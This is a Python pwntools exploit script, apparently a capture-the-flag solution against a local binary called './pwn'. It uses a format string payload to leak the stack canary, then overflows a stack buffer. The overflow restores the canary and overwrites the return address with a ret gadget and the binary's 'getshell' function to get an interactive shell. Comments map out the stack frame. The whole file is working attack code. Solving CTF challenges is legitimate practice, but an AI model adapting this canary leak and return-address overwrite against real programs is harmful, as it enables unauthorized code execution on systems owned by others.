from pwn import *

from pwn import *

exe = './pwn'
elf = ELF(exe)

context.binary = elf

p = process(exe)

p.recvuntil(b'Dark Magic is here!\n')

canary_padd = b'%35$p'
pad_len = 100 - len(canary_padd)
payload_1 = canary_padd + b'A'*pad_len + p32(2)

p.sendline(payload_1)
time.sleep(0.1)

p.sendline(b'teapafrate')

leak_line = p.recvline().strip()
leak_str = leak_line.split(b'A')[0]
canary = int(leak_str,16)
print(leak_str)

log.success(f"Canary Found: {hex(canary)}")

# RBP + 0x08,Return Address,8,Target: Overwrite with getshell
# RBP + 0x00,Saved RBP,8,Junk
# RBP - 0x10,local_10 (Canary),8,Guard: Must match leaked value
# RBP - 0x80,acStack_80,112,Input 2: Used for final overflow
# RBP - 0x84,local_84,4,Loop Counter: Controls execution flow
# RBP - 0xe8,local_e8,100,Input 1: Used for leak

p.sendline(b'teapadinnou')
time.sleep(0.1)

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Ret Gadget: {hex(ret_gadget)}")

getshell = elf.symbols['getshell']

payload_2 = flat(
    b'A'*112,
    canary,
    b'B'*8,
    ret_gadget,
    getshell
)
p.sendline(payload_2)
p.interactive()